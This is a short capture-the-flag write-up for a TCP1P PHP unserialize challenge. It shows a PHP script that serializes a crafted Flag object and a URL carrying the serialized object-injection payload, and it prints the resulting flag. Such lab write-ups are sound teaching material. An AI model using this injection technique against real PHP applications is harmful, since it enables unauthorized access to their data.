# PHP Unserialize 
> Write-up author: jon-brandy
## DESCRIPTION:
Apakah kamu tahu unserialize di php?

http://ctf.tcp1p.com:32116/

## HINT:
- NONE
## STEPS:
1. First open the link given.

> RESULT

![image](https://user-images.githubusercontent.com/70703371/214860552-6fe49e50-8480-49f4-8ef3-3d7ed0a1e99a.png)


2. Analyzing the php script, we know that we need to specify the value of 'a' parameter so we can get the flag.
3. Well i did a small outsource about `unserialize()` function in php.

![image](https://user-images.githubusercontent.com/70703371/214862485-50031694-9464-4f8b-ae06-7ffca26646c2.png)


4. So we need to convert a the class flag as the new object so we can use it (because if we want to access the class, we need to convert it to a new object), change the bool value of `$isflag` to true and serialized the user input, then echo it. 

> PHP SCRIPT 

```php
<?php
class Flag
{
	public function get_flag() // public function -> can be accessed outside the class scope
	{
	  readfile("../flag.txt");
	}
	public bool $isflag = true;
}

$userInput = new Flag; // convert flag from class to new Object
echo serialize($userInput);

?>
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/214871146-3ae99054-bea6-464d-b6b8-7f3a45f720a1.png)


5. Now let's change the url to this:

```
http://ctf.tcp1p.com:32116/?a=O:4:%22Flag%22:1:{s:6:%22isflag%22;b:1;}
```

> OUTPUT

![image](https://user-images.githubusercontent.com/70703371/214871233-44ca9ed8-64a7-463b-8c37-8168ca9984b7.png)


6. Got the flag!

## FLAG

```
TCP1P{unserialize_in_php_to_get_the_flag}
```
